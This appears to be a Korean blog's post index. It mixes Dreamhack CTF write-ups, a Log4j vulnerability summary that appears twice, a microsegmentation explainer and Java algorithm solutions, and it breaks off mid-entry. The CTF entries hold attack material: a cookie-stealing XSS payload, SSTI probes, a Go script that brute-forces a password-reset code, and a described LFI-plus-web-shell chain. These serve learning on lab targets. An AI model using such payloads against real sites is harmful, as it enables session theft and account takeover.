[{"content":"[문제]  쿠키와 세션으로 인증 상태를 관리하는 간단한 로그인 서비스입니다. admin 계정으로 로그인에 성공하면 플래그를 획득할 수 있습니다.  [해결법]  이 문제는 admin 세션을 탈취하여 변조하면 되는 문제였다. 제공하는 소스를 확인해보면 /admin 페이지가 있는 것을 확인 할 수있는데 해당 페이지에서 admin 세션 값을 획득 할 수 있었다. 해당 세션 정보로 쿠키에 저장되어있는 세션값을 변조하면 통과할 수 있다.  ","date":"2022-02-13T11:03:12+09:00","permalink":"https://appealso.github.io/p/dreamhack-session-basic/","title":"[dreamhack] session-basic"},{"content":"[문제]  입력 폼에 데이터를 입력하여 맞으면 플래그, 틀리면 NOP !을 출력하는 HTML 페이지입니다. main 함수를 분석하여 올바른 입력 값을 찾아보세요 !  [해결법]  이 문제는 난독화된 html 파일을 해독하는 문제였다. 끝에 for loop만 잘 수정해주면 답이 나오는 문제였는데 변수 별로 의미를 파악하려다 보니 삽질을 좀 했다. for loop 수정 부분은 아래 참고하면 된다.\n var s = \u0026#34;\u0026#34;; for (var i = 0x0; i \u0026lt; 36; i++) { s += String.fromCharCode( operator[i % operator[_0x374fd6(0x17c)]](_0x4949[i], _0x42931[i]) ); } console.log(s); ","date":"2022-02-05T21:40:29+09:00","permalink":"https://appealso.github.io/p/dreamhack-funjs/","title":"[dreamhack] funjs"},{"content":"마이크로 세그멘테이션 과거 컴퓨터 시스템, 네트워크 및 응용 프로그램은 상대적으로 정적이었습니다. 동일한 네트워크를 따라 흐르는 데이터 연결, 매일, 응용 프로그램은 동일한 시스템에서 실행되었으며, 정적 방화벽 규칙 및 액세스 제어 목록 (ACL)을 사용하여 시스템 간 트래픽을 제한할 수 있습니다. 그러나 오늘날의 IT 환경은 훨씬 복잡하고 역동적입니다.\n  다중 계층 애플리케이션은 종종 여러 데이터 센터와 클라우드 플랫폼 걸쳐 있습니다. 응용 프로그램은 매일 릴리스 되고 향상됩니다. 소프트웨어 모듈은 새 가상 머신에서 스핀업 된 다음 서로 다른 물리적 서버 간에 이동합니다. 새로운 인스턴스의 모듈은 요구에 따라 Scale up and down합니다. 조직에서는 지속적으로 애플리케이션 이동, 클라우드 리소스 활용 및 워크로드 통합 시 데이터 센터를 재구성 해야합니다.   대부분의 IT 영역은 이러한 변화 속도에 보조를 맞추었지만 보안프로세스는 여전히 수동적입니다. 이러한 결과로 기술 및 비즈니스 혁신에 브레이크를 겁니다.\n1. 기존 시스템 대부분의 데이터 센터는 아래 그림과 같이 클라우드 영역과 데이터 센터 영역으로 나뉩니다. 영역 간의 트래픽은 일반적으로 방화벽에서 트래픽 필터링 정책이 구성됩니다.  Image 1 \n2. 기존 시스템의 문제점 이와 같은 구성으로 인해 기존 시스템은 아래와 같은 문제점들이 발생합니다.\n  공격자가 방화벽으로 구분되지 않은 영역에 침투를 할 수 있을 경우 그 안에 있는 많은 응용 프로그램을 대상으로 공격을 할 수 있음 방화벽의 가격은 비싸며 네트워크 재설계가 필요할 경우 비용이 많이 발생 방화벽은 일반적으로 수천 개의 규칙으로 구성되어 정책 관리가 힘듬 데이터 센터와 클라우드 플랫폼은 서로 다른 보안 도구를 사용하기 때문에 클라우드 환경과 데이터 센터 간의 액세스 규칙을 관리하기가 매우 어려움 전체 시스템을 효과적으로 모니터링할 수 없음   3. 마이크로 세그멘테이션(Microsegmentation) 마이크로 세그먼테이션(Microsegmentation)은 IT 환경을 통제 가능한 구역으로 분할해 각 워크로드를 상호 안전하게 격리하는 동시에 네트워크 보호를 더 세분화함으로써 승인되지 않은 횡적 이동 문제에 대처하는 방법론입니다.  Image 2 \n마이크로세그먼테이션은 성능과 관리에 중점을 둔 네트워크 세그먼테이션(network segmentation)의 단순한 연장선상에 있는 기술이 아닌 네트워크 보호 문제에 대처해 위험을 낮추고 동적인 IT 환경의 요구에 상응해 보안을 조정하기 위한 목적으로 설계된 기술입니다.  Image 3  Image 4  마이크로세그먼테이션은 하나의 중앙 정책을 사용하되 보안 집행은 각각의 개별 시스템으로 분산시킵니다. 경계만이 아니라 조직 네트워크 전반에서 세분화된 정책 실행을 가능하게 해줍니다. 이 접근 방식이 필요한 이유는 경계 보안이 종종 실패한다는 점, 그리고 클라우드 도입으로 인해 네트워크 경계에 구멍이 많아졌다는 점에있습니다.\n","date":"2022-02-01T19:20:51+09:00","image":"https://appealso.github.io/p/microsegmentation/cover_huf9867630df38a1b7a1b101a60c990fcb_94636_120x120_fill_q75_box_smart1.jpg","permalink":"https://appealso.github.io/p/microsegmentation/","title":"Microsegmentation"},{"content":"[문제]  할로윈 파티를 기념하기 위해 호박을 준비했습니다! 호박을 10000번 클릭하고 플래그를 획득하세요!\n [해결법]  JavaScript click 이벤트를 10000번 호출 하면되는 문제였다. 간단히 while문으로 호출해서 풀 수 있었다.\n ","date":"2022-01-31T16:40:43+09:00","permalink":"https://appealso.github.io/p/dreamhack-carve-party/","title":"[dreamhack] Carve Party"},{"content":"[문제]  존재하지 않는 페이지 방문시 404 에러를 출력하는 서비스입니다. SSTI 취약점을 이용해 플래그를 획득하세요. 플래그는 flag.txt, FLAG 변수에 있습니다. [해결법]  URL 뒤에 {{7*7}}을 넣으면 49가 나오는것으로 보아 SSTI 취약점이 있는것을 추측 할 수 있다.{URL}/{{config}}로 시도 시에 키 값을 간단한게 얻을 수 있었다. ","date":"2022-01-31T16:13:01+09:00","permalink":"https://appealso.github.io/p/dreamhack-simple-ssti/","title":"[dreamhack] simple-ssti"},{"content":"[문제]  python으로 작성된 로그인 기능을 가진 서비스입니다. “admin” 권한을 가진 사용자로 로그인하여 플래그를 획득하세요.\n [해결법]  제공하는 app.py만 잘 해석하면 풀 수 있는 문제였다. \u0026lsquo;/forgot_password\u0026rsquo;에 \u0026ldquo;time.sleep(1)\u0026rdquo; 구문이 있는데 1초안에 1~100까지 랜덤으로 생성되는 backupCode를 요청하면되었다. python으로 간단히 요청 코드를 작성하면 해결된다. 아래는 go 연습할겸 만든 코드 아래코드로 시도해도된당\n package main import ( \u0026#34;fmt\u0026#34; \u0026#34;net/http\u0026#34; \u0026#34;net/url\u0026#34; \u0026#34;runtime\u0026#34; \u0026#34;strconv\u0026#34; \u0026#34;time\u0026#34; ) func main() { runtime.GOMAXPROCS(runtime.NumCPU() - 2) for i := 1; i \u0026lt;= 100; i++ { go postRequst(i) } time.Sleep(time.Second * 3) } func postRequst(i int) { backupCode := strconv.Itoa(i) fmt.Println(backupCode + \u0026#34;번째시도\u0026#34;) resp, err := http.PostForm(\u0026#34;\u0026lt;문제URL\u0026gt;/forgot_password\u0026#34;, url.Values{\u0026#34;userid\u0026#34;: {\u0026#34;Apple\u0026#34;}, \u0026#34;newpassword\u0026#34;: {\u0026#34;Apple\u0026#34;}, \u0026#34;backupCode\u0026#34;: {backupCode}}) if err != nil { panic(err) } defer resp.Body.Close() } ","date":"2022-01-31T15:42:56+09:00","permalink":"https://appealso.github.io/p/dreamhack-login-1/","title":"[dreamhack] login-1"},{"content":"[문제]  여기본 설정을 사용한 서비스입니다. 로그인한 후 Organization에 플래그를 설정해 놓았습니다.  [해결법]  문제파일에 admin 정보가 있었다. 접속 후에 Organizaion 정보 찾으면 끝.. 5분안걸린듯.. ","date":"2022-01-31T14:54:40+09:00","permalink":"https://appealso.github.io/p/dreamhack-web-misconf-1/","title":"[dreamhack] web-misconf-1"},{"content":"최근 발표된 log4j 라이브러리에서 발견된 취약점을 정리하려고 합니다. 공격 방법에 비해 영향도가 너무 높아 크게 이슈가 된 취약점이 아닐까 생각이 듭니다.\n[개요]  java 에서 사용되는 log4j 라이브러리에서 취약점이 발표 되었고, 대부분의 라이브러리\n [주요내용]  Apache Log4j 2에서 발생하는 원격코드 실행 취약점(CVE-2021-44228) Apache Log4j 2에서 발생하는 원격코드 실행 취약점(CVE-2021-45046) Apache Log4j 1.x에서 발생하는 원격코드 실행 취약점(CVE-2021-4104)\n [영향받는버전]  CVE-2021-44228: 2.0-beta9 ~ 2.14.1 이하 (2.3.1, 2.12.2, 2.12.3 제외) CVE-2021-45046: 2.0-beta9 ~ 2.15.0 버전 (2.3.1, 2.12.2, 2.12.3 제외) CVE-2021-4104: 1.x 버전 ※ JMSAppender를 사용하지 않는 경우 취약점 영향 없음\n [취약점 설명]  log4j \n log4j 공격 방법은 심플 합니다. 공격자는 log4j를 사용하여 로그를 남기는 부분에 payload를 삽입하면 공격은 끝납니다. 공격이 성공하면 자신이 운영하고 있는 LDAP서버에서 공격 코드를 다운로드받아 공격을 시도한 서버에서 해당 코드를 실행시키는 원리입니다. 공격코드를 주입하는 방식에 따라 분류됩니다.\n CVE-2021-44228 : log4j로 로그를 남기는 부분에 직접 payload를 삽입하는 방식 CVE-2021-45046 : 변수 등에 payload를 삽입해 두고, 해당 변수를 호출하는 방식 CVE-2021-4104 : 환경변수파일(ex.log4j.properties)에 payload를 삽입해 놓고 로그를 남길때 공격하는 방식(로그를 남길때 payload가 실행됨)   [공격가능한시나리오] 공격시나리오는 아래 3가지를 생각해보았습니다.\n (1) 외부에서 Payload를 삽입을 시도하며 외부에 미리 구성해둔 LDAP서버로 부터 공격 코드를 받아 가게 하는 방식\n 공격자 입장에서는 가장 흔한 공격 방식일 것 같고, OutBound 정책만 잘 구성되어있다면 영향도가 없을 것으로 예상됐습니다.    (2) 내부에서 Payload를 삽입을 시도하며 외부에 미리 구성해둔 LDAP서버로 부터 공격 코드를 받아 가게 하는 방식\n 내부에서 공격 가능한 포인트를 찾아 외부에 구성해놓은 서버로 부터 공격코드를 받아 실행 하는 방식을 생각해 보았는데 이것 역시 OutBound 정책이 잘 구성되어있으면 영향도가 낮을 것으로 생각되었습니다.    (3) 내부에서 Payload를 삽입을 시도하며 내부에 미리 구성해둔 LDAP서버로 부터 공격 코드를 받아 가게 하는 방식\n 내부에서 공격서버를 구성하고, 내부에서 공격 코드를 실행하는 방식을 생각해 보았는데 내부 서버 팜의 경우 방화벽이 없기 떄문에 가장 영향도 높은 공격이 가능할 것으로 예상되었습니다. Spring Boot 같은 것을 사용하면 LDAP 서버를 구성하는 것이 쉽기 때문에 공격 자체도 어렵지 않은 것으로 예상이 되었습니다.   [공격 테스트방법]  LDAP 서버를 구성하면 시간이 들기때문에 페이로가 삽입될 만한 부분을 찾고 NC를 사용해서 리스너를 열고, 해당 리스너로 패킷이 들어오는지 여부를 체크하면 쉽게 공격 가능여부를 테스트 해볼 수 있습니다. 우회 공격을 시도할 경우 Github에서 payload 생성기 같은 것들을 찾아서 시도해볼 수 있습니다. 링크는 아래 참조. https://github.com/woodpecker-appstore/log4j-payload-generator\n [조치방안]  조치 방법은 안전한 버전으로 업데이트 하는것이겠지만, 1.x버전에서 안전한 버전으로 올리는 것은 영향도가 높기 때문에 적용하기까지 시간이 소요될 것입니다. 이를 위해서 할 수 있는 조치는 ips에서 룰생성을 통해 들어오는 공격을 방어하고 문제되는 JNDI LOOKUP기능을 비활성화 하는 방법이 있을 것입니다.\n [참조] https://aws.amazon.com/ko/blogs/korea/using-aws-security-services-to-protect-against-detect-and-respond-to-the-log4j-vulnerability/ https://www.krcert.or.kr/data/secNoticeView.do?bulletin_writing_sequence=36389\n","date":"2021-12-26T20:27:18+09:00","permalink":"https://appealso.github.io/p/log4j-%EC%B7%A8%EC%95%BD%EC%A0%90-%EC%A0%95%EB%A6%AC/","title":"Log4j 취약점 정리"},{"content":"최근 발표된 log4j 라이브러리에서 발견된 취약점을 정리하려고 합니다. 공격 방법에 비해 영향도가 너무 높아 크게 이슈가 된 취약점이 아닐까 생각이 듭니다.\n[개요]  java 에서 사용되는 log4j 라이브러리에서 취약점이 발표 되었고, 대부분의 라이브러리\n [주요내용]  Apache Log4j 2에서 발생하는 원격코드 실행 취약점(CVE-2021-44228) Apache Log4j 2에서 발생하는 원격코드 실행 취약점(CVE-2021-45046) Apache Log4j 1.x에서 발생하는 원격코드 실행 취약점(CVE-2021-4104)\n [영향받는버전]  CVE-2021-44228: 2.0-beta9 ~ 2.14.1 이하 (2.3.1, 2.12.2, 2.12.3 제외) CVE-2021-45046: 2.0-beta9 ~ 2.15.0 버전 (2.3.1, 2.12.2, 2.12.3 제외) CVE-2021-4104: 1.x 버전 ※ JMSAppender를 사용하지 않는 경우 취약점 영향 없음\n [취약점 설명]  log4j \n log4j 공격 방법은 심플 합니다. 공격자는 log4j를 사용하여 로그를 남기는 부분에 payload를 삽입하면 공격은 끝납니다. 공격이 성공하면 자신이 운영하고 있는 LDAP서버에서 공격 코드를 다운로드받아 공격을 시도한 서버에서 해당 코드를 실행시키는 원리입니다. 공격코드를 주입하는 방식에 따라 분류됩니다.\n CVE-2021-44228 : log4j로 로그를 남기는 부분에 직접 payload를 삽입하는 방식 CVE-2021-45046 : 변수 등에 payload를 삽입해 두고, 해당 변수를 호출하는 방식 CVE-2021-4104 : 환경변수파일(ex.log4j.properties)에 payload를 삽입해 놓고 로그를 남길때 공격하는 방식(로그를 남길때 payload가 실행됨)   [공격가능한시나리오] 공격시나리오는 아래 3가지를 생각해보았습니다.\n (1) 외부에서 Payload를 삽입을 시도하며 외부에 미리 구성해둔 LDAP서버로 부터 공격 코드를 받아 가게 하는 방식\n 공격자 입장에서는 가장 흔한 공격 방식일 것 같고, OutBound 정책만 잘 구성되어있다면 영향도가 없을 것으로 예상됐습니다.    (2) 내부에서 Payload를 삽입을 시도하며 외부에 미리 구성해둔 LDAP서버로 부터 공격 코드를 받아 가게 하는 방식\n 내부에서 공격 가능한 포인트를 찾아 외부에 구성해놓은 서버로 부터 공격코드를 받아 실행 하는 방식을 생각해 보았는데 이것 역시 OutBound 정책이 잘 구성되어있으면 영향도가 낮을 것으로 생각되었습니다.    (3) 내부에서 Payload를 삽입을 시도하며 내부에 미리 구성해둔 LDAP서버로 부터 공격 코드를 받아 가게 하는 방식\n 내부에서 공격서버를 구성하고, 내부에서 공격 코드를 실행하는 방식을 생각해 보았는데 내부 서버 팜의 경우 방화벽이 없기 떄문에 가장 영향도 높은 공격이 가능할 것으로 예상되었습니다. Spring Boot 같은 것을 사용하면 LDAP 서버를 구성하는 것이 쉽기 때문에 공격 자체도 어렵지 않은 것으로 예상이 되었습니다.   [공격 테스트방법]  LDAP 서버를 구성하면 시간이 들기때문에 페이로가 삽입될 만한 부분을 찾고 NC를 사용해서 리스너를 열고, 해당 리스너로 패킷이 들어오는지 여부를 체크하면 쉽게 공격 가능여부를 테스트 해볼 수 있습니다. 우회 공격을 시도할 경우 Github에서 payload 생성기 같은 것들을 찾아서 시도해볼 수 있습니다. 링크는 아래 참조. https://github.com/woodpecker-appstore/log4j-payload-generator\n [조치방안]  조치 방법은 안전한 버전으로 업데이트 하는것이겠지만, 1.x버전에서 안전한 버전으로 올리는 것은 영향도가 높기 때문에 적용하기까지 시간이 소요될 것입니다. 이를 위해서 할 수 있는 조치는 ips에서 룰생성을 통해 들어오는 공격을 방어하고 문제되는 JNDI LOOKUP기능을 비활성화 하는 방법이 있을 것입니다.\n [참조] https://aws.amazon.com/ko/blogs/korea/using-aws-security-services-to-protect-against-detect-and-respond-to-the-log4j-vulnerability/ https://www.krcert.or.kr/data/secNoticeView.do?bulletin_writing_sequence=36389\n","date":"2021-12-26T00:00:00Z","permalink":"https://appealso.github.io/p/log4j-%EC%B7%A8%EC%95%BD%EC%A0%90-%EC%A0%95%EB%A6%AC/","title":"Log4j 취약점 정리"},{"content":"[문제]  여러 기능과 입력받은 URL을 확인하는 봇이 구현된 서비스입니다. XSS 취약점을 이용해 플래그를 획득하세요. 플래그는 flag.txt, FLAG 변수에 있습니다.\n [해결법]  \u0026lt;img src=\u0026lsquo;x\u0026rsquo; onerror=\u0026lsquo;location.href=\u0026quot;/memo?memo=\u0026quot;+document.cookie;'\u0026gt;\n ","date":"2021-10-05T22:28:53+09:00","permalink":"https://appealso.github.io/p/dreamhack-xss-2/","title":"[dreamhack] xss-2"},{"content":"[문제]  드림이가 톰캣 서버로 개발을 시작하였습니다. 서비스의 취약점을 찾아 플래그를 획득하세요. 플래그는 /flag 경로에 있습니다.\n [해결법]   LFI로 tomcat 비밀번호 획득 웹쉘 업로드 하여 플래그 탈취 ++ 설마\u0026hellip;웹쉘 올려야 하는지 고민하다가 너무 올래걸렸다\u0026hellip;ㅜㅜ ++ 톰캣 취약점을 알고 있긴 했는데 직접 공격해보니깐 느낌이 이상했다.   [참고] https://m.blog.naver.com/PostView.naver?isHttpsRedirect=true\u0026blogId=sjhmc9695\u0026logNo=221996754470\n","date":"2021-10-05T21:46:26+09:00","permalink":"https://appealso.github.io/p/dreamhack-tomcat-manager/","title":"[dreamhack] Tomcat Manager"},{"content":"[문제]  드림이는 웹 크롤링 사이트를 구축했습니다. 크롤링 사이트에서 취약점을 찾고 flag를 획득하세요!\n [해결법] ssrf 우회 기법으로 ipaddress.ip_address(ip)).is_global 우회\n[참고] https://umbum.dev/473\n","date":"2021-10-05T21:40:18+09:00","permalink":"https://appealso.github.io/p/dreamhack-crawling/","title":"[dreamhack] crawling"},{"content":"[문제]  크기가 N인 수열 A = A1, A2, \u0026hellip;, AN이 있다. 수열의 각 원소 Ai에 대해서 오큰수 NGE(i)를 구하려고 한다. Ai의 오큰수는 오른쪽에 있으면서 Ai보다 큰 수 중에서 가장 왼쪽에 있는 수를 의미한다. 그러한 수가 없는 경우에 오큰수는 -1이다. 예를 들어, A = [3, 5, 2, 7]인 경우 NGE(1) = 5, NGE(2) = 7, NGE(3) = 7, NGE(4) = -1이다. A \u0026gt; = [9, 5, 4, 8]인 경우에는 NGE(1) = -1, NGE(2) = 8, NGE(3) = 8, NGE(4) = -1이다.\n [입력]  첫째 줄에 수열 A의 크기 N (1 ≤ N ≤ 1,000,000)이 주어진다. 둘째 줄에 수열 A의 원소 A1, A2, \u0026hellip;, AN (1 ≤ Ai ≤ 1,000,000)이 주어진다.\n [출력]  N개의 수 NGE(1), NGE(2), \u0026hellip;, NGE(N)을 공백으로 구분해 출력한다.\n [소스] import java.io.BufferedReader; import java.io.InputStreamReader; import java.util.Stack; import java.util.StringTokenizer; public class Main { public static void main(String args[]) throws Exception{ BufferedReader br = new BufferedReader(new InputStreamReader(System.in)); Stack\u0026lt;Integer\u0026gt; st = new Stack\u0026lt;\u0026gt;(); int A = Integer.parseInt(br.readLine()); int[] seq = new int[A]; int[] ans = new int[A]; StringTokenizer stk = new StringTokenizer(br.readLine(),\u0026#34; \u0026#34;); for(int i=0;i\u0026lt;A;i++) seq[i]=Integer.parseInt(stk.nextToken()); for(int i=A-1;i\u0026gt;=0;i--){ while(!st.isEmpty()\u0026amp;\u0026amp;st.peek()\u0026lt;=seq[i]) st.pop(); if(st.isEmpty())ans[i]=-1; else ans[i]=st.peek(); st.push(seq[i]); } StringBuilder sb = new StringBuilder(); for(int tmp : ans) sb.append(tmp+\u0026#34; \u0026#34;); System.out.println(sb); } } 문제링크 https://www.acmicpc.net/problem/17298\n","date":"2021-08-29T14:26:07+09:00","permalink":"https://appealso.github.io/p/%EB%B0%B1%EC%A4%80-17298-%EC%98%A4%ED%81%B0%EC%88%98/","title":"백준 17298 오큰수"},{"content":"[문제]  세계는 균형이 잘 잡혀있어야 한다. 양과 음, 빛과 어둠 그리고 왼쪽 괄호와 오른쪽 괄호처럼 말이다. 정민이의 임무는 어떤 문자열이 주어졌을 때, 괄호들의 균형이 잘 맞춰져 있는지 판단하는 프로그램을 짜는 것이다. 문자열에 포함되는 괄호는 소괄호(\u0026quot;()\u0026quot;) 와 대괄호(\u0026quot;[]\u0026quot;)로 2종류이고, 문자열이 균형을 이루는 조건은 아래와 같다.\n 모든 왼쪽 소괄호(\u0026quot;(\u0026quot;)는 오른쪽 소괄호(\u0026quot;)\u0026quot;)와만 짝을 이뤄야 한다. 모든 왼쪽 대괄호(\u0026quot;[\u0026quot;)는 오른쪽 대괄호(\u0026quot;]\u0026quot;)와만 짝을 이뤄야 한다. 모든 오른쪽 괄호들은 자신과 짝을 이룰 수 있는 왼쪽 괄호가 존재한다. 모든 괄호들의 짝은 1:1 매칭만 가능하다. 즉, 괄호 하나가 둘 이상의 괄호와 짝지어지지 않는다. 짝을 이루는 두 괄호가 있을 때, 그 사이에 있는 문자열도 균형이 잡혀야 한다. 정민이를 도와 문자열이 주어졌을 때 균형잡힌 문자열인지 아닌지를 판단해보자.   [입력]  하나 또는 여러줄에 걸쳐서 문자열이 주어진다. 각 문자열은 영문 알파벳, 공백, 소괄호(\u0026quot;( )\u0026quot;) 대괄호(\u0026quot;[ ]\u0026quot;)등으로 이루어져 있으며, 길이는 100글자보다 작거나 같다. 입력의 종료조건으로 맨 마지막에 점 하나(\u0026quot;.\u0026quot;)가 들어온다.\n [출력]  각 줄마다 해당 문자열이 균형을 이루고 있으면 \u0026ldquo;yes\u0026quot;를, 아니면 \u0026ldquo;no\u0026quot;를 출력한다.\n [소스] import java.util.Scanner; import java.util.Stack; public class Main { public static void main(String[] args) throws Exception{ Scanner sc = new Scanner(System.in); Stack\u0026lt;Character\u0026gt; st; while(true){ String tmp = sc.nextLine(); if(tmp.equals(\u0026#34;.\u0026#34;)) break; st=new Stack\u0026lt;Character\u0026gt;(); for(int i=0;i\u0026lt;tmp.length();i++){ char c = tmp.charAt(i); if(c==\u0026#39;(\u0026#39;||c==\u0026#39;[\u0026#39;) st.push(c); if(c==\u0026#39;)\u0026#39;||c==\u0026#39;]\u0026#39;){ if(st.isEmpty() || (st.peek() == \u0026#39;(\u0026#39; \u0026amp;\u0026amp; c == \u0026#39;]\u0026#39;) || (st.peek() == \u0026#39;[\u0026#39; \u0026amp;\u0026amp; c == \u0026#39;)\u0026#39;)){ st.push(c); break; } else st.pop(); } } if(st.isEmpty()) System.out.println(\u0026#34;yes\u0026#34;); else System.out.println(\u0026#34;no\u0026#34;); } } } 문제링크 https://www.acmicpc.net/problem/4949\n","date":"2021-08-22T15:38:35+09:00","permalink":"https://appealso.github.io/p/%EB%B0%B1%EC%A4%80-4949-%EA%B7%A0%ED%98%95%EC%9E%A1%ED%9E%8C-%EC%84%B8%EC%83%81/","title":"백준 4949 균형잡힌 세상"},{"content":"[문제]  스도쿠는 18세기 스위스 수학자가 만든 \u0026lsquo;라틴 사각형\u0026rsquo;이랑 퍼즐에서 유래한 것으로 현재 많은 인기를 누리고 있다. 이 게임은 아래 그림과 같이 가로, 세로 각각 9개씩 총 81개의 작은 칸으로 이루어진 정사각형 판 위에서 이뤄지는데, 게임 시작 전 일부 칸에는 1부터 9까지의 숫자 중 하나가 쓰여 있다.\n 스도쿠 \n나머지 빈 칸을 채우는 방식은 다음과 같다.\n 각각의 가로줄과 세로줄에는 1부터 9까지의 숫자가 한 번씩만 나타나야 한다. 굵은 선으로 구분되어 있는 3x3 정사각형 안에도 1부터 9까지의 숫자가 한 번씩만 나타나야 한다.  위의 예의 경우, 첫째 줄에는 1을 제외한 나머지 2부터 9까지의 숫자들이 이미 나타나 있으므로 첫째 줄 빈칸에는 \u0026gt; 1이 들어가야 한다.\n 스도쿠 \n또한 위쪽 가운데 위치한 3x3 정사각형의 경우에는 3을 제외한 나머지 숫자들이 이미 쓰여있으므로 가운데 빈 칸에는 \u0026gt; 3이 들어가야 한다.  스도쿠 \n이와 같이 빈 칸을 차례로 채워 가면 다음과 같은 최종 결과를 얻을 수 있다.  스도쿠 \n게임 시작 전 스도쿠 판에 쓰여 있는 숫자들의 정보가 주어질 때 모든 빈 칸이 채워진 최종 모습을 출력하는 프로그램을 작성하시오.\n [입력]  아홉 줄에 걸쳐 한 줄에 9개씩 게임 시작 전 스도쿠판 각 줄에 쓰여 있는 숫자가 한 칸씩 띄워서 차례로 주어진다. 스도쿠 판의 빈 칸의 경우에는 0이 주어진다. 스도쿠 판을 규칙대로 채울 수 없는 경우의 입력은 주어지지 않는다.\n [출력]  모든 빈 칸이 채워진 스도쿠 판의 최종 모습을 아홉 줄에 걸쳐 한 줄에 9개씩 한 칸씩 띄워서 출력한다. 스도쿠 판을 채우는 방법이 여럿인 경우는 그 중 하나만을 출력한다.\n [소스] import java.io.BufferedReader; import java.io.InputStreamReader; import java.util.ArrayList; import java.util.StringTokenizer; public class Main { static int[][] sudoku = new int[9][9]; static ArrayList\u0026lt;int[]\u0026gt; list= new ArrayList\u0026lt;\u0026gt;(); static boolean check=false; public static void main(String[] args) throws Exception{ BufferedReader br = new BufferedReader(new InputStreamReader(System.in)); for(int i=0;i\u0026lt;9;i++) { StringTokenizer stk = new StringTokenizer(br.readLine(), \u0026#34; \u0026#34;); for (int j = 0; j \u0026lt; 9; j++) { sudoku[i][j] = Integer.parseInt(stk.nextToken()); if (sudoku[i][j] == 0) { list.add(new int[]{i, j}); } } } go(0,0); } static void go(int idx,int depth){ if(depth==list.size()){ StringBuilder sb=new StringBuilder(); for(int i = 0; i \u0026lt; 9; i++) { for (int j = 0; j \u0026lt; 9; j++) { sb.append(sudoku[i][j] + \u0026#34; \u0026#34;); } sb.append(\u0026#39;\\n\u0026#39;); } System.out.println(sb); check=true; return; } if(check) return; if(idx\u0026gt;=list.size()) return; int i=list.get(idx)[0]; int j=list.get(idx)[1]; for(int k=1;k\u0026lt;=9;k++){ if(check(i,j,k)){ sudoku[i][j]=k; go(idx+1,depth+1); sudoku[i][j]=0; } } } static boolean check(int i,int j,int n){ for(int k=0;k\u0026lt;9;k++) { if (sudoku[i][k]==n) return false; if (sudoku[k][j]==n) return false; } int ni=i/3*3; int nj=j/3*3; for(int k=ni;k\u0026lt;ni+3;k++){ for(int l=nj;l\u0026lt;nj+3;l++) if(sudoku[k][l]==n) return false; } return true; } } 문제링크 https://www.acmicpc.net/problem/2580\n","date":"2021-08-21T11:27:56+09:00","permalink":"https://appealso.github.io/p/%EB%B0%B1%EC%A4%80-2580-%EC%8A%A4%EB%8F%84%EC%BF%A0/","title":"백준 2580 스도쿠"},{"content":"[문제]  세 개의 장대가 있고 첫 번째 장대에는 반경이 서로 다른 n개의 원판이 쌓여 있다. 각 원판은 반경이 큰 순서대로 쌓여있다. 이제 수도승들이 다음 규칙에 따라 첫 번째 장대에서 세 번째 장대로 옮기려 한다.s\n 한 번에 한 개의 원판만을 다른 탑으로 옮길 수 있다. 쌓아 놓은 원판은 항상 위의 것이 아래의 것보다 작아야 한다.  이 작업을 수행하는데 필요한 이동 순서를 출력하는 프로그램을 작성하라. 단, 이동 횟수는 최소가 되어야 한다.\n아래 그림은 원판이 5개인 경우의 예시이다.\n 하노이탑! \n [입력]  첫째 줄에 첫 번째 장대에 쌓인 원판의 개수 N (1 ≤ N ≤ 20)이 주어진다.\n [출력]  첫째 줄에 옮긴 횟수 K를 출력한다. 두 번째 줄부터 수행 과정을 출력한다. 두 번째 줄부터 K개의 줄에 걸쳐 두 정수 A B를 빈칸을 사이에 두고 출력하는데, 이는 A번째 탑의 가장 위에 있는 원판을 B번째 탑의 가장 위로 옮긴다는 뜻이다.\n [소스] import java.io.BufferedReader; import java.io.InputStreamReader; import java.util.StringTokenizer; public class Main { static int ans=0; static StringBuilder sb=new StringBuilder(); public static void main(String[] args) throws Exception{ BufferedReader br=new BufferedReader(new InputStreamReader(System.in)); StringTokenizer stk=new StringTokenizer(br.readLine()); int N=Integer.parseInt(stk.nextToken()); go(1,2,3, N); System.out.println(ans); System.out.print(sb); } static void go(int from,int sub, int to, int N){ ans++; if(N==1){ sb.append(from+\u0026#34; \u0026#34;+to+\u0026#34;\\n\u0026#34;); return; } go(from,to,sub,N-1); sb.append(from+\u0026#34; \u0026#34;+to+\u0026#34;\\n\u0026#34;); go(sub,from,to,N-1); } } 문제링크 https://www.acmicpc.net/problem/11729\n","date":"2021-08-16T11:57:47+09:00","permalink":"https://appealso.github.io/p/%EB%B0%B1%EC%A4%80-11729-%ED%95%98%EB%85%B8%EC%9D%B4-%ED%83%91-%EC%9D%B4%EB%8F%99-%EC%88%9C%EC%84%9C/","title":"백준 11729 하노이 탑 이동 순서"},{"content":"[문제]  재귀적인 패턴으로 별을 찍어 보자. N이 3의 거듭제곱(3, 9, 27, \u0026hellip;)이라고 할 때, 크기 N의 패턴은 N×N 정사각형 모양이다. 크기 3의 패턴은 가운데에 공백이 있고, 가운데를 제외한 모든 칸에 별이 하나씩 있는 패턴이다.\n***\n* *\n***\nN이 3보다 클 경우, 크기 N의 패턴은 공백으로 채워진 가운데의 (N/3)×(N/3) 정사각형을 크기 N/3의 패턴으로 둘러싼 형태이다. 예를 들어 크기 27의 패턴은 예제 출력 1과 같다.\n [입력]  첫째 줄에 N이 주어진다. N은 3의 거듭제곱이다. 즉 어떤 정수 k에 대해 N=3k이며, 이때 1 ≤ k \u0026lt; 8이다.\n [출력]  첫째 줄부터 N번째 줄까지 별을 출력한다\n [소스] import java.io.BufferedReader; import java.io.InputStreamReader; import java.util.StringTokenizer; public class Main { static StringBuilder sb = new StringBuilder(); public static void main(String[] args) throws Exception{ BufferedReader br=new BufferedReader(new InputStreamReader(System.in)); StringTokenizer stk=new StringTokenizer(br.readLine()); int N=Integer.parseInt(stk.nextToken()); for(int i=0;i\u0026lt;N;i++) { for (int j = 0; j \u0026lt; N; j++) go(i, j, N); sb.append(\u0026#39;\\n\u0026#39;); } System.out.println(sb); } static void go(int i,int j,int N){ if((i/N%3==1\u0026amp;\u0026amp;(j/N)%3==1)){ sb.append(\u0026#39; \u0026#39;); }else if(N/3==0) sb.append(\u0026#39;*\u0026#39;); else go(i,j,N/3); } } 문제링크 https://www.acmicpc.net/problem/2447\n","date":"2021-08-16T09:22:57+09:00","permalink":"https://appealso.github.io/p/%EB%B0%B1%EC%A4%80-2447-%EB%B3%84%EC%B0%8D%EA%B8%B0-10/","title":"백준 2447 별찍기-10"},{"content":"[문제]  나코더 기장 재민이는 동아리 회식을 준비하기 위해서 장부를 관리하는 중이다. 재현이는 재민이를 도와서 돈을 관리하는 